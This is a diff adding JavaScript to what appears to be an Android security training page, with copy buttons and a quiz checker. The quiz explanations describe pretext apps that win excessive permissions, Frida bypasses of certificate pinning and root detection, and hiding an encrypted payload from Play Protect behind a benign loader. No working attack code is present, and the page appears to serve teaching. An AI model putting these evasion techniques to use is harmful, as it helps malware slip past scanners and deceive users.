+        // Copy buttons for code blocks
+        document.querySelectorAll('.code-block, .smali-code, .frida-code').forEach(block => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'COPY';
+            btn.addEventListener('click', () => {
+                const text = block.textContent.replace('COPY', '').trim();
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.textContent = 'COPIED!';
+                    setTimeout(() => btn.textContent = 'COPY', 2000);
+                });
+            });
+            block.appendChild(btn);
+        });
+
+        // Copy-paste boxes
+        document.querySelectorAll('.copy-paste').forEach(box => {
+            box.addEventListener('click', () => {
+                const text = box.textContent.trim();
+                navigator.clipboard.writeText(text).then(() => {
+                    const original = box.textContent;
+                    box.textContent = 'COPIED!';
+                    setTimeout(() => box.textContent = original, 2000);
+                });
+            });
+        });
+
+        // Quiz functionality
+        function checkAnswer(option, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById('feedback-' + quizId);
+            
+            // Disable all options
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt.dataset.correct === 'true') {
+                    opt.classList.add('correct');
+                } else if (opt === option) {
+                    opt.classList.add('wrong');
+                }
+            });
+            
+            // Show feedback
+            feedback.classList.add('show');
+            if (option.dataset.correct === 'true') {
+                feedback.classList.add('correct');
+                feedback.innerHTML = '<strong>✓ CORRECT</strong><br>' + getExplanation(quizId, true);
+            } else {
+                feedback.classList.add('wrong');
+                feedback.innerHTML = '<strong>✗ WRONG</strong><br>' + getExplanation(quizId, false);
+            }
+        }
+
+        function getExplanation(quizId, isCorrect) {
+            const explanations = {
+                'quiz-1': 'Android users are conditioned to tap "Allow" repeatedly during app setup. A well-designed pretext (e.g., a "System Update" or "COVID Tracker" app) makes excessive permissions seem reasonable. The attacker designs the permission request to match the pretext.',
+                'quiz-2': 'Static analysis reads the code as it appears on disk. But apps can use reflection, encryption, and dynamic loading to hide behavior. Frida hooks running methods, intercepts API calls, and reveals the actual behavior regardless of obfuscation. It also bypasses certificate pinning and root detection at runtime.',
+                'quiz-3': 'Play Protect scans the APK file before installation. If the APK contains only a benign loader and the real payload is encrypted in assets/ or downloaded later, Play Protect sees nothing malicious. The payload is decrypted and loaded into memory at runtime, leaving no static artifact for the scanner to detect.'
+            };
+            return explanations[quizId] || 'Keep studying!';
+        }
+    </script>
 </body>
 </html>
